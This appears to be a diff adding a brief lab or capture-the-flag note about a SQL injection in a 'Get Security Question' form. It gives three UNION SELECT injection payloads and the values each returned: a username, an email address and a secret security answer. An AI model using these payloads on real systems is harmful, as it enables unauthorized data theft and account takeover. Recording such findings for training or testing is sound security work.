@@ -1,0 +1,10 @@
+The vulnerability is in the "Get Security Question" button form
+
+* " AND 1=0 UNION ALL SELECT username FROM users;--
+    -> manager
+
+* " AND 1=0 UNION ALL SELECT useraddress FROM users;--
+    -> zoidberg23@shepherd.com
+
+* " AND 1=0 UNION ALL SELECT secretanswer FROM users;--
+    -> Lena Andrysiak
